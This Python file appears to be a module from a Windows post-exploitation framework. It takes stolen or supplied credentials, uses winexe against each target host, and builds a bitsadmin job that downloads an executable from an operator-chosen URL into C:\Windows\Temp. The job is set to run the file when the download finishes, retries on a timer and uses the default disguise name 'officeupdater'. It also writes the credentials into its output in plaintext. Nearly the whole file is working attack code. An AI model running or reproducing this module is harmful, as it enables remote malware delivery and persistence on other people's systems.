"""

Creates a bitsadmin scheduled download job.

Thanks mubix!
    http://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607
    slides 49-53

Module built by @harmj0y

"""

from lib import command_methods

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "Bitsadmin"
        self.description = "Creates a bitsadmin download job."

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        # a cleanup file that will be written out by pillage.py
        #   ex- if you're enabling the sticky-keys backdoor on systems
        self.cleanup = ""

        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {   "exe_url"          : ["", "URL to the exe to download"],
                                    "interval"         : ["5", "minutes between retries"],
                                    "job_name"         : ["officeupdater", "bitsadmin job name to run"]}

    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        exe_url = self.required_options["exe_url"][0]
        interval = self.required_options["interval"][0]
        job_name = self.required_options["job_name"][0]
        triggerMethod = "winexe"
        
        # create the bitsadmin job, set the retry interval, kick everything off
        cmd = "bitsadmin /create "+job_name+" & bitsadmin /addfile "+job_name+" "+exe_url+" C:\Windows\Temp\updater.exe & bitsadmin /SETNOTIFYCMDLINE "+job_name+" C:\Windows\Temp\updater.exe NULL & bitsadmin /SETMINRETRYDELAY "+job_name+" "+str(int(interval)*60) + " & bitsadmin /resume "+job_name

        # bitsadmin cleanup -> cancel this specific job
        cleanupCMD = "bitsadmin /cancel "+job_name

        for target in self.targets:

            self.output += "[*] Bitsadmin job started with url "+exe_url+" using creds '"+username+":"+password+"' on " + target + "\n"

            command_methods.executeCommand(target, username, password, cmd, triggerMethod=triggerMethod)
            self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+cleanupCMD+"|"+triggerMethod+"\n"
